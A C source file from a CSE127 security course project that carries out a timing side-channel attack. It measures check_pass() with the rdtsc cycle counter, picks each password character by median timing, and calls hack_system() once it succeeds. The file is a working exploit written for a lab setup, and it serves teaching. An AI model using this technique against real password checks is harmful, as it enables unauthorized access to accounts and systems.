/*******************************************************
 CSE127 Project
 User routines file
 
   Name: 
   Email: 
   Student ID: 

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 *******************************************************/


#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

// include our "system" header
#include "sysapp.h"

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

int int_cmp(const void *a, const void *b) {
	return *(unsigned long *)a - *(unsigned long *)b;
}

int main(int argc, char ** argv) {
	char 			guess[17];
	char            chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	char            best_char;
	int             i, j;
	int             len;
	int             max;
	unsigned long   t_s;
	unsigned long   t_e;
	unsigned long   times[100];
                                                                                                                                                                                                          
	bzero(guess, sizeof(guess));
	for (len = 0; len < 16; len++)
	{
		max = 0;
		for (i = 0; chars[i]; i++)
		{
			guess[len] = chars[i];
			for (j = 0; j < 100; j++)
			{
				t_s = rdtsc();
				if (check_pass(guess))
					hack_system(guess);
				t_e = rdtsc();
				times[j] = t_e - t_s;
			}
			qsort(times, 100, sizeof(unsigned long), int_cmp);
			if (times[49] > max) {
				max = times[49];
				best_char = chars[i];
			}
		}
		guess[len] = best_char;
	}
	return 1;
}
